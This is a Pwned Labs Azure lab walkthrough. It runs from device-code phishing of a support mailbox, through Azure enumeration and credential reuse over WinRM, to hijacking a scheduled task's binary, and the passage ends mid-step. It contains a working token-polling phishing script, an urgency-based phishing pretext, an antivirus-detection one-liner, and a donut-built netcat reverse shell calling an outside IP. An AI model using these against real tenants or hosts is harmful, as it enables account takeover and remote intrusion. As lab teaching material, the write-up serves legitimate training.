---
title: Leverage Device Code Phishing for Initial Access
description: Leverage Device Code Phishing for Initial Access
image:
  path: azure.webp
categories:
- Pwned Labs
- Azure
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/azure/
tags:
- pwnedlabs
- azure
- cloud
---
# Scenario
Our client International Asset Management has asked us to perform a red team engagement. They want us to start externally as a threat actor would, try and breach their environment and access resources belonging to director or C-level executives. Phishing is in scope, and International Asset Management's IT partners have also agreed to be included in the test.

# Walkthrough
We are given domain, so let's start with checking all DNS records that are associated with the domain
```
└─$ dig international-am.com any +noall +answer
international-am.com.   1800    IN      A       20.75.112.13
international-am.com.   3600    IN      NS      ns29.domaincontrol.com.
international-am.com.   3600    IN      NS      ns30.domaincontrol.com.
international-am.com.   3600    IN      SOA     ns29.domaincontrol.com. dns.jomax.net. 2024102703 28800 7200 604800 600
international-am.com.   3600    IN      MX      0 internationalam-com03c.mail.protection.outlook.com.
international-am.com.   3600    IN      TXT     "v=spf1 include:spf.protection.outlook.com -all"
international-am.com.   3600    IN      TXT     "_e5vsccc1uzkgivciwbepfxx8ij6c4qd"

```
We can do the same in Powershell
```
$domain = "international-am.com"
$records = @()
$records += Resolve-DnsName -Name $domain -Type A -ErrorAction SilentlyContinue
$records += Resolve-DnsName -Name $domain -Type AAAA -ErrorAction SilentlyContinue
$records += Resolve-DnsName -Name $domain -Type MX -ErrorAction SilentlyContinue
$records += Resolve-DnsName -Name $domain -Type TXT -ErrorAction SilentlyContinue
$records += Resolve-DnsName -Name $domain -Type NS -ErrorAction SilentlyContinue
$records += Resolve-DnsName -Name $domain -Type CNAME -ErrorAction SilentlyContinue
$records | Format-List
```

We receive hostname of the mail server for `international-am.com` is `internationalam-com03c.mail.protection.outlook.com`. This mail server is part of Microsoft’s Office 365 or Outlook mail protection service, which is indicated by the `mail.protection.outlook.com`.

Let's confirm that the company uses Microsoft 365 and Entra ID. We can use the `GetUserRealm.srf` endpoint to determine whether `international-am.com` is a managed (cloud-only) or federated domain. With a federated domain, user authentication is delegated to an external IdP, such as Active Directory Federation Services (ADFS).
```
└─$ curl 'https://login.microsoftonline.com/getuserrealm.srf?login=international-am.com&xml=1' | xml_pp
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   429  100   429    0     0    233      0  0:00:01  0:00:01 --:--:--   233
<RealmInfo Success="true">
  <State>4</State>
  <UserState>1</UserState>
  <Login>international-am.com</Login>
  <NameSpaceType>Managed</NameSpaceType>
  <DomainName>international-am.com</DomainName>
  <IsFederatedNS>false</IsFederatedNS>
  <FederationBrandName>Default Directory</FederationBrandName>
  <CloudInstanceName>microsoftonline.com</CloudInstanceName>
  <CloudInstanceIssuerUri>urn:federation:MicrosoftOnline</CloudInstanceIssuerUri>
</RealmInfo>

```
`NameSpaceType` is managed, which means that Entra ID is the identity provider. So we've established that International Asset Management use Entra ID and Microsoft 365. Do ?

Let's check if they also use Azure resources by checking the website IP address from the DNS A host record. IP Info is a reliable source of IP data. Sending a request to https://ipinfo.io reveals that the IP address `20.75.112.13` is part of Microsoft-registered address space.
```
└─$ curl https://ipinfo.io/20.75.112.13
{
  "ip": "20.75.112.13",
  "city": "Boydton",
  "region": "Virginia",
  "country": "US",
  "loc": "36.6676,-78.3875",
  "org": "AS8075 Microsoft Corporation",
  "postal": "23917",
  "timezone": "America/New_York",
  "readme": "https://ipinfo.io/missingauth"
}    
```

We can also get the region using https://azservicetags.azurewebsites.net. This is a service provided to the `community` and shouldn't be brute-forced.
```
└─$ curl --silent 'https://azservicetags.azurewebsites.net/api/iplookup?ipAddresses=20.75.112.13' | jq
[
  {
    "ipAddress": "20.75.112.13",
    "isIPAddressValid": true,
    "matchedServiceTags": [
      {
        "ipAddress": "20.75.112.13",
        "cloudId": "Public",
        "serviceTagId": "AzureCloud.eastus2",
        "serviceTagRegion": "eastus2",
        "addressPrefix": "20.75.0.0/17"
      },
      {
        "ipAddress": "20.75.112.13",
        "cloudId": "Public",
        "serviceTagId": "AzureCloud",
        "serviceTagRegion": "",
        "addressPrefix": "20.75.0.0/17"
      }
    ]
  }
]

```
Let's check the website https://international-am.com/ in a browser

![](leverage-device-code-phishing-for-initial-access-1.png)

There's a client login page, which returns `support@international-am.com` support contact when we enter incorrect credentials

![](leverage-device-code-phishing-for-initial-access-2.png)

Since the phishing is in scope, this could be useful. Seeing as this is a support account, it probably has some privileges that can be helpful. Let's send a phishing email to this mailbox.

Let's try device code phishing. It leverages the Entra ID device code authentication flow, which is a way of logging in on input-constrained devices, allowing the user to input a user code on second device and complete authentication, to approve the login session on the first device. 
  - A user starts an app that supports device code flow on an device.
  - The app connects to the Entra ID `/devicecode` endpoint and submits a `client_id` and `resource`.
  - Entra ID returns a `device_code`, `user_code`, and `verification_url`.
  - The device displays the `verification_url` (https://microsoft.com/devicelogin) along with the `user_code` for the user.
  - The user navigates to the `verification_url` in a web browser, enters the `user_code` as prompted, and logs in.
  - The device continuously queries Entra ID and, once the login is verified as successful, it receives an `access_token` and a `refresh_token`.

The process can be seen in the diagram below. Read more about the attack from here: [Introducing a new phishing technique for compromising Office 365 account](https://aadinternals.com/post/phishing/)

![](leverage-device-code-phishing-for-initial-access-3.png)

First, let's complete steps 2 and 3 of the authentication flow. We see the default user code expiry time of `900` seconds (15 minutes). We specify the well-known Microsoft Office application ID as the client ID, to help make the request seem more legitimate (we can choose any application ID). A list of common Microsoft application IDs is available [here](https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications).
```
└─PS> $body=@{     
>>     "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
>>     "resource" =  "https://graph.microsoft.com"
>> }
```
```
└─PS> $authResponse=(Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body)
```
```
└─PS> $authResponse

user_code        : NMZJQAUF9
device_code      : NAQABIQEAAABVrSpeuWamRam2jAF1XRQE09ndKVv49gk6jy3CqsuWeI1_QmYA6xXlaj_oohySLh1yuqREoxbKZ893aWC0ubNDRt6JzQlD4B02hPEkbIa-d7tvRnvN_EUBmjc9eDlN_TvvSrB-FLnQj7W9r-Xw7_TVZhmqhsJABLLn8rsMZk-8V38-I16FqkbdAIY8tZSRGBUgAA
verification_url : https://microsoft.com/devicelogin
expires_in       : 900
interval         : 5
message          : To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code NMZJQAUF9 to authenticate.
```

Now create a script that continuously queries the token endpoint and polls for authentication status. On successful authentication the script will print our the access token (although a more valuable refresh token is also stored in the variable).

Make sure to hit enter after pasting this into your terminal, so the last line that prints the access token also executes.

The `resource` in the PowerShell is set to https://graph.microsoft.com, which is the Microsoft Graph API endpoint that allows us to interact with Entra ID and Microsoft 365. If we instead wanted to target Azure and get Azure Resource Manager tokens we could instead set the resource value to the Azure https://management.azure.com/ or https://management.core.windows.net/ API endpoints. Either way, it also returns the refresh token, allowing us to create bearer tokens for other services we may wish to access.
```
$response = ""
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

$body=@{
    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" = $authResponse.device_code
    "resource" = "https://graph.microsoft.com"
}

while($continue)
{
    Start-Sleep -Seconds $interval
    $total += $interval

    if($total -gt $expires)
    {
        Write-Error "Timeout occurred"
        return
    }

    try
    {
        $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
    }
    catch
    {
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Host $details.error

        if(!$continue)
        {
            Write-Error $details.error_description
            return
        }
    }

    if($response)
    {
      break
    }
}
$response.access_token
```

Now we need to send our phishing email. We can send any phishing pretext. The pretext below makes it seem that the device code login request comes from an authoritative and trusted source (International Asset Management IT) and it also conveys a sense of urgency and threat, compelling the user to take immediate action to avoid losing access.

![](leverage-device-code-phishing-for-initial-access-4.png)

After few minutes, we see access token

![](leverage-device-code-phishing-for-initial-access-5.png)

We can copy the token to https://jwt.io. We see that the display name name of the phished user is `International Asset Management (Mega Big Tech MSSP Support)`. We got a foodhold in the cloud environment, but we have phished the MSSP (Managed Security Service Provider) used by International Asset Management.

![](leverage-device-code-phishing-for-initial-access-6.png)

Now use access token to get authenticated session using the Microsoft Graph PowerShell SDK. 
```
└─PS> Connect-MgGraph -AccessToken ($access_token | ConvertTo-SecureString -AsPlainText -Force)
Welcome to Microsoft Graph!

Connected via userprovidedaccesstoken access using d3590ed6-52b3-4102-aeff-aad2292ab01c
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.
```

Let's confirm our execution context.
```
└─PS> Get-MgContext

ClientId               : d3590ed6-52b3-4102-aeff-aad2292ab01c
TenantId               : 2590ccef-687d-493b-ae8d-441cbab63a72
Scopes                 : {AuditLog.Create, Calendar.ReadWrite, Calendars.Read.Shared, Calendars.ReadWrite…}
AuthType               : UserProvidedAccessToken
TokenCredentialType    : UserProvidedAccessToken
CertificateThumbprint  : 
CertificateSubjectName : 
SendCertificateChain   : False
Account                : support@international-am.com
AppName                : Microsoft Office
ContextScope           : Process
Certificate            : 
PSHostVersion          : 7.5.1
ManagedIdentityId      : 
ClientSecret           : 
Environment            : Global

```

Now we can enumerate Entra ID and Microsoft 365, which use Microsoft Graph. We could also alternatively set the resource / API endpoint in the phishing script to the Azure Service Management API https://management.azure.com, send a new phishing email, and enumerate Azure resources instead.

However, it is also worth showing how to initiate a device code flow using the Azure CLI. Instead of running the PowerShell script above to generate the user code and retrieve the token, we'll now show this with the Azure CLI.

This will also output a user code that we can include in our phishing email.

Send phishing email by using output of the Azure CLI command below. After a while have an authenticated Azure CLI session. The Azure CLI handles both generating the device code and waiting for the authentication, so we don't need to run two separate commands / scripts this time.
```
└─PS> az login --use-device-code                                                                                                                                                                                                            
To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DWMWD46QE to authenticate.

Retrieving tenants and subscriptions for the selection...

[Tenant and subscription selection]

No     Subscription name            Subscription ID                       Tenant
-----  ---------------------------  ------------------------------------  -----------------
[1] *  Microsoft Azure Sponsorship  ceff06cb-e29d-4486-a3ae-eaaec5689f94  Default Directory

The default is marked with an *; the default tenant is 'Default Directory' and subscription is 'Microsoft Azure Sponsorship' (ceff06cb-e29d-4486-a3ae-eaaec5689f94).

Select a subscription and tenant (Type a number or Enter for no changes): 1

Tenant: Default Directory
Subscription: Microsoft Azure Sponsorship (ceff06cb-e29d-4486-a3ae-eaaec5689f94)

[Announcements]
With the new Azure CLI login experience, you can select the subscription you want to use more easily. Learn more about it and its configuration at https://go.microsoft.com/fwlink/?linkid=2271236

If you encounter any problem, please open an issue at https://aka.ms/azclibug

[Warning] The login output has been updated. Please be aware that it no longer displays the full list of available subscriptions by default.
```

When using the Azure CLI on Linux and Mac, the access and refresh tokens are exposed and stored unencrypted in the file` ~/.azure/msal_token_cache.json`. On Windows, the tokens are encrypted using the Data Protection API (DPAPI).

Running `az account show` confirms our execution context.
```
└─PS> az account show
{
  "environmentName": "AzureCloud",
  "homeTenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "id": "ceff06cb-e29d-4486-a3ae-eaaec5689f94",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Microsoft Azure Sponsorship",
  "state": "Enabled",
  "tenantDefaultDomain": "megabigtech.com",
  "tenantDisplayName": "Default Directory",
  "tenantId": "2590ccef-687d-493b-ae8d-441cbab63a72",
  "user": {
    "name": "support@international-am.com",
    "type": "user"
  }
}

```

Let's enumerate available resources
```
└─PS> az resource list
[
  {
    "changedTime": "2024-10-25T17:14:30.767020+00:00",
    "createdTime": "2024-10-25T17:04:29.778163+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Web/staticSites/InternationalAssetManager",
    "identity": null,
    "kind": null,
    "location": "eastus2",
    "managedBy": null,
    "name": "InternationalAssetManager",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "mbt-rg-22",
    "sku": {
      "capacity": null,
      "family": null,
      "model": null,
      "name": "Free",
      "size": null,
      "tier": "Free"
    },
    "tags": {},
    "type": "Microsoft.Web/staticSites"
  },
  {
    "changedTime": "2024-11-01T23:36:00.398299+00:00",
    "createdTime": "2024-11-01T23:25:55.987539+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Network/publicIPAddresses/SECURITY-DIRECTOR-ip",
    "identity": null,
    "kind": null,
    "location": "eastus",
    "managedBy": null,
    "name": "SECURITY-DIRECTOR-ip",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "mbt-rg-22",
    "sku": {
      "capacity": null,
      "family": null,
      "model": null,
      "name": "Standard",
      "size": null,
      "tier": null
    },
    "tags": null,
    "type": "Microsoft.Network/publicIPAddresses",
    "zones": [
      "1"
    ]
  },
  {
    "changedTime": "2024-12-08T23:17:29.883722+00:00",
    "createdTime": "2024-12-08T22:48:01.631022+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Compute/virtualMachines/SECURITY-DIRECTOR",
    "identity": null,
    "kind": null,
    "location": "eastus",
    "managedBy": null,
    "name": "SECURITY-DIRECTOR",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "mbt-rg-22",
    "sku": null,
    "tags": {
      "Company": "International Asset Management"
    },
    "type": "Microsoft.Compute/virtualMachines",
    "zones": [
      "1"
    ]
  },
  {
    "changedTime": "2024-12-08T22:58:00.408145+00:00",
    "createdTime": "2024-12-08T22:47:56.006782+00:00",
    "extendedLocation": null,
    "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Network/publicIPAddresses/SECURITYDIRECTORip304",
    "identity": null,
    "kind": null,
    "location": "eastus",
    "managedBy": null,
    "name": "SECURITYDIRECTORip304",
    "plan": null,
    "properties": null,
    "provisioningState": "Succeeded",
    "resourceGroup": "mbt-rg-22",
    "sku": {
      "capacity": null,
      "family": null,
      "model": null,
      "name": "Standard",
      "size": null,
      "tier": null
    },
    "tags": null,
    "type": "Microsoft.Network/publicIPAddresses",
    "zones": [
      "1"
    ]
  }
]

```

A summary of the JSON output:
  - There is an Azure Static Web App named `InternationalAssetManager` hosted in the resource group `mbt-rg-22` .
  - There is an Azure Virtual Machine named `SECURITY-DIRECTOR` that is tagged with `Company: International Asset Management`, and we also have access to the public IP address resource.

Let's check Azure Static Web App
```
└─PS> az staticwebapp show --name InternationalAssetManager --resource-group mbt-rg-22                                                                                                                                                      
{
  "allowConfigFileUpdates": true,
  "branch": null,
  "buildProperties": null,
  "contentDistributionEndpoint": "https://content-eus2.infrastructure.5.azurestaticapps.net",
  "customDomains": [
    "international-am.com"
  ],
  "databaseConnections": [],
  "defaultHostname": "thankful-desert-07de31b0f.5.azurestaticapps.net",
  "enterpriseGradeCdnStatus": "Disabled",
  "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Web/staticSites/InternationalAssetManager",
  "identity": null,
  "keyVaultReferenceIdentity": "SystemAssigned",
  "kind": null,
  "linkedBackends": [],
  "location": "East US 2",
  "name": "InternationalAssetManager",
  "privateEndpointConnections": [],
  "provider": "SwaCli",
  "publicNetworkAccess": null,
  "repositoryToken": null,
  "repositoryUrl": null,
  "resourceGroup": "mbt-rg-22",
  "sku": {
    "capabilities": null,
    "capacity": null,
    "family": null,
    "locations": null,
    "name": "Free",
    "size": null,
    "skuCapacity": null,
    "tier": "Free"
  },
  "stagingEnvironmentPolicy": "Enabled",
  "tags": {},
  "templateProperties": null,
  "type": "Microsoft.Web/staticSites",
  "userProvidedFunctionApps": null
}

```

We see the custom domain `international-am.com`, so this resource is hosting the website we saw earlier. Let's check out the Azure Static Web App settings.
```
└─PS> az staticwebapp appsettings list --name InternationalAssetManager --resource-group mbt-rg-22                                                                                                                                          
{
  "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Web/staticSites/InternationalAssetManager/config/appsettings",
  "kind": null,
  "location": "East US 2",
  "name": "appsettings",
  "properties": {
    "APP_VERSION": "2.1.1",
    "DATABASE_CONNECTION_STRING": "Server=tcp:iamclientportal.database.windows.net,1433;Initial Catalog=users;Persist Security Info=False;User ID=admin;Password=<REDACTED>;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"
  },
  "resourceGroup": "mbt-rg-22",
  "type": "Microsoft.Web/staticSites/config"
}
```
We see two environment variables have been defined: 
- App version 
- Database connection string that contains credentials: `admin:<REDACTED>`

But we can't resolve the DNS entry
```
└─$ nslookup iamclientportal.database.windows.net
Server:         192.168.226.2
Address:        192.168.226.2#53

** server can't find iamclientportal.database.windows.net: NXDOMAIN

```

Let's check VM 
```
└─PS> az vm show --resource-group mbt-rg-22 --name SECURITY-DIRECTOR                                                                                                                                                                        
{
  "additionalCapabilities": {
    "hibernationEnabled": false,
    "ultraSsdEnabled": null
  },
  "applicationProfile": null,
  "availabilitySet": null,
  "billingProfile": null,
  "capacityReservation": null,
  "diagnosticsProfile": {
    "bootDiagnostics": {
      "enabled": true,
      "storageUri": null
    }
  },
  "etag": "\"5804\"",
  "evictionPolicy": null,
  "extendedLocation": null,
  "extensionsTimeBudget": null,
  "hardwareProfile": {
    "vmSize": "Standard_B2s",
    "vmSizeProperties": null
  },
  "host": null,
  "hostGroup": null,
  "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Compute/virtualMachines/SECURITY-DIRECTOR",
  "identity": null,
  "instanceView": null,
  "licenseType": "Windows_Server",
  "location": "eastus",
  "managedBy": null,
  "name": "SECURITY-DIRECTOR",
  "networkProfile": {
    "networkApiVersion": null,
    "networkInterfaceConfigurations": null,
    "networkInterfaces": [
      {
        "deleteOption": "Detach",
        "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Network/networkInterfaces/security-director23_z1",
        "primary": null,
        "resourceGroup": "mbt-rg-22"
      }
    ]
  },
  "osProfile": null,
  "placement": null,
  "plan": null,
  "platformFaultDomain": null,
  "priority": null,
  "provisioningState": "Succeeded",
  "proximityPlacementGroup": null,
  "resourceGroup": "mbt-rg-22",
  "resources": null,
  "scheduledEventsPolicy": null,
  "scheduledEventsProfile": null,
  "securityProfile": null,
  "storageProfile": {
    "alignRegionalDisksToVmZone": null,
    "dataDisks": [],
    "diskControllerType": "SCSI",
    "imageReference": null,
    "osDisk": {
      "caching": "ReadWrite",
      "createOption": "Attach",
      "deleteOption": "Detach",
      "diffDiskSettings": null,
      "diskSizeGb": 127,
      "encryptionSettings": null,
      "image": null,
      "managedDisk": {
        "diskEncryptionSet": null,
        "id": "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Compute/disks/SECURITY-DIRECTOR",
        "resourceGroup": "mbt-rg-22",
        "securityProfile": null,
        "storageAccountType": "StandardSSD_LRS"
      },
      "name": "SECURITY-DIRECTOR",
      "osType": "Windows",
      "vhd": null,
      "writeAcceleratorEnabled": null
    }
  },
  "tags": {
    "Company": "International Asset Management"
  },
  "timeCreated": "2024-12-08T22:48:01.681267+00:00",
  "type": "Microsoft.Compute/virtualMachines",
  "userData": null,
  "virtualMachineScaleSet": null,
  "vmId": "53420129-b4dc-460c-bb02-071b0208c6b9",
  "zones": [
    "1"
  ]
}

```
It's worth checking if VM has User Data defined. User Data allows admins to make information available to applications that may be running in a VM or even to run a configuration script on the VM.
```
└─PS> az vm show --resource-group "mbt-rg-22" --name "SECURITY-DIRECTOR" -u --query "userData" --output tsv | base64 -d
net user remoteassist /active:yes
```
We could also make direct API call by using the access token
```
$token="<access_token_value>"
Invoke-RestMethod -Method GET -Uri "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-22/providers/Microsoft.Compute/virtualMachines/SECURITY-DIRECTOR?api-version=2021-07-01&`$expand=userData" -Headers @{Authorization = "Bearer $token"}
```

We see that support or the admins have defined user data to enable the `remoteassist` local account on the VM every time it boots.

Let's get the public IP address of the VM.
```
└─PS> az network public-ip show --resource-group mbt-rg-22 --name SECURITYDIRECTORip304 --query "ipAddress" --output tsv
20.127.161.82
```

Now let's perform port scan
```
└─$ nmap -Pn --top-ports 1000 20.127.161.82
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 20:27 +06
Nmap scan report for 20.127.161.82
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

We see ports 53 (DNS), 3389 (RDP) and 5985 (Windows Remote Management) are available. We can try and connect to the instance over port 5985 as the support user, and try the password that we found in the Web App. And we got a foothold on the `SECURITY-DIRECTOR` VM
```
└─$ evil-winrm -i 20.127.161.82 -u remoteassist -p '<REDACTED>'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\remoteassist\Documents> 
```
It seems that the local user doesn't have the privileges
```
*Evil-WinRM* PS C:\Users\remoteassist\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
We see other user named `james_local`
```
*Evil-WinRM* PS C:\Users\remoteassist\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
AdministratorAccount     DefaultAccount           Guest
james_local              remoteassist             WDAGUtilityAccount
The command completed with one or more errors.
```

`james_local` is a security director
```
*Evil-WinRM* PS C:\Users\remoteassist\Documents> net user james_local
User name                    james_local
Full Name                    James Brandt (Security Director)
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/2/2024 1:05:30 AM
Password expires             Never
Password changeable          11/2/2024 1:05:30 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/15/2025 9:43:55 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.

```

We see non-standard `DownloadSecurityReports` directory in the `C:\`
```
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/14/2025   2:26 PM                DownloadSecurityReports
d-----          1/8/2025   6:59 PM                Logs
d-----        10/29/2024  10:59 PM                Packages
d-----          5/8/2021   8:20 AM                PerfLogs
d-----        10/31/2024  12:26 AM                Program Files
d-----        10/31/2024   1:35 AM                Program Files (x86)
d-----         8/13/2025   6:23 AM                Temp
d-r---         11/2/2024  11:27 PM                Users
d-r---        10/30/2024   3:36 PM                Windows
d-----         2/24/2025   5:08 PM                WindowsAzure

```
We see the binary `pcsp.exe`, a command line tool for transferring files to and from Windows using the SSH protocol (Windows version of scp). However, it's actually worth noting that current versions of Windows (including the target) actually have both ssh and scp clients installed by default.

We could guess that the file `M365BaselineConformance.zip` is being transferred using `pscp.exe`. Checking the timestamp of the zip file, the time is within the last 5 minutes, so possibly there is a scheduled task running that is executing it.
```
*Evil-WinRM* PS C:\DownloadSecurityReports> ls


    Directory: C:\DownloadSecurityReports


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/14/2025   2:36 PM         430236 M365BaselineConformance.zip
-a----        10/30/2024   9:17 PM         997136 pscp.exe
```
From a security perspective, this scheduled task is running in the context of James or administrator local users, and if we can replace the binary with our own malicious version, we could get command execution in the context of that user.

The permissions show that the Authenticated Users group has permissions to (M)odify the file (Create+Delete+Read+Write). This includes our remoteassist user account.
```
*Evil-WinRM* PS C:\DownloadSecurityReports> icacls pscp.exe
pscp.exe NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

Let's first download the archive
```
*Evil-WinRM* PS C:\DownloadSecurityReports> download M365BaselineConformance.zip
                                        
Info: Downloading C:\DownloadSecurityReports\M365BaselineConformance.zip to M365BaselineConformance.zip
                                        
Info: Download successful!
```

We see a SCuBA report for the Mega Big Tech M365 and Entra ID environment. ScubaGear is an assessment tool created by CISA, that verifies that a Microsoft 365 tenant’s configuration conforms to the policies described in the Secure Cloud Business Applications ([SCuBA](https://cisa.gov/scuba)) Security Configuration Baseline [documents](https://github.com/cisagov/ScubaGear/blob/main/baselines/README.md)

![](leverage-device-code-phishing-for-initial-access-7.png)

Before planting our binary, let's check if anti-virus is running on the endpoint. We can use a simple PowerShell one-liner to check this.
```
$processes = @{ "acnamagent" = "Absolute Persistence - Asset Management"; "acnamlogonagent" = "Absolute Persistence - Asset Management"; "AGMService" = "Adobe - Telemetry"; "AGSService" = "Adobe - Telemetry"; "aswidsagent" = "Avast - AV"; "avastsvc" = "Avast - AV"; "avastui" = "Avast - AV"; "avgnt" = "Avira - AV"; "avguard" = "Avira - AV"; "axcrypt" = "AxCrypt - Encryption"; "bdntwrk" = "Bitdefender - AV"; "updatesrv" = "Bitdefender - AV"; "bdagent" = "Bitdefender Total Security - AV"; "vsserv" = "Bitdefender Total Security - AV"; "cpd" = "Check Point Daemon - Security"; "fw" = "Check Point Firewall - Firewall"; "vpnagent" = "Cisco AnyConnect - VPN"; "vpnui" = "Cisco AnyConnect - VPN"; "aciseagent" = "Cisco Umbrella - Security DNS"; "acumbrellaagent" = "Cisco Umbrella - Security DNS"; "CmRcService" = "CmRcService - Remote Control"; "csfalconcontainer" = "CrowdStrike Falcon - EDR"; "csfalcondaterepair" = "CrowdStrike Falcon - EDR"; "csfalconservice" = "CrowdStrike Falcon - EDR"; "cbcomms" = "CrowdStrike Falcon Insight XDR"; "cybereason" = "Cybereason EDR"; "cytomicendpoint" = "Cytomic Orion - Security"; "DarktraceTSA" = "Darktrace - EDR"; "dsmonitor" = "DriveSentry - Security"; "dwengine" = "DriveSentry - Security"; "egui" = "ESET NOD32 AV"; "ekrn" = "ESET NOD32 AV"; "winlogbeat" = "Elastic Winlogbeat - Security"; "firesvc" = "FireEye Endpoint Agent - Security"; "firetray" = "FireEye Endpoint Agent - Security"; "xagt" = "FireEye HX - Security"; "fortiedr" = "FortiEDR - EDR"; "hips" = "Host Intrusion Prevention System - HIPS"; "avp" = "Kaspersky - AV"; "avpui" = "Kaspersky - AV"; "klwtblfs" = "Kaspersky - AV"; "klwtpwrs" = "Kaspersky - AV"; "ksde" = "Kaspersky Secure Connection - VPN"; "ksdeui" = "Kaspersky Secure Connection - VPN"; "kpf4ss" = "Kerio Personal Firewall - Firewall"; "mbae64" = "Malwarebytes - AV"; "mbamservice" = "Malwarebytes - AV"; "mbamswissarmy" = "Malwarebytes - AV"; "mbamtray" = "Malwarebytes - AV"; "mfeann" = "McAfee - AV"; "mfemms" = "McAfee - AV"; "masvc" = "McAfee - AV"; "macmnsvc" = "McAfee - AV"; "dlpsensor" = "McAfee DLP Sensor - DLP"; "eegoservice" = "McAfee Endpoint Encryption - Encryption"; "mdecryptservice" = "McAfee Endpoint Encryption - Encryption"; "mfeepehost" = "McAfee Endpoint Encryption - Encryption"; "edpa" = "McAfee Endpoint Security - AV"; "shstat" = "McAfee Endpoint Security - AV"; "mcshield" = "McAfee Endpoint Security - AV"; "mfefire" = "McAfee Endpoint Security - Firewall"; "msascuil" = "Windows Defender - AV"; "msmpeng" = "Windows Defender - AV"; "windefend" = "Windows Defender - AV"; "SecurityHealthService" = "Windows Security Health Service"; "tanclient" = "Tanium EDR - EDR" }; foreach ($key in $processes.Keys) { $description = $processes[$key]; if (![string]::IsNullOrWhiteSpace($key)) { $process = Get-Process -Name $key -ErrorAction SilentlyContinue; if ($process) { Write-Output "$description is running." } } }
```
No output, seems like there's no anti-virus running.

We can use any C2 during real engagements (sliver, havoc etc.). In this case we work with `netcat`. Deploy listener on EC2 (or Azure VM)
```
root@ip-172-31-21-144:/home/ubuntu# nc -lvnp 443
Listening on 0.0.0.0 443
```
Create a binary. In this case, we used [donut](https://github.com/TheWover/donut) to create a shellcode from `nc64.exe` with parameters
```
└─$ ~/tools/red-team/c2-toolkit/donut -i ~/tools/red-team/c2-toolkit/nc64.exe  -p '54.227.84.188 443 -e cmd' -o pscp.bin 
```
Now we can create a executable/loader from shellcode using [myph](https://github.com/matro7sh/myph)
```
└─$ myph --shellcode pscp.bin --out pscp
```

Now upload the binary
```
*Evil-WinRM* PS C:\DownloadSecurityReports> rm pscp.exe
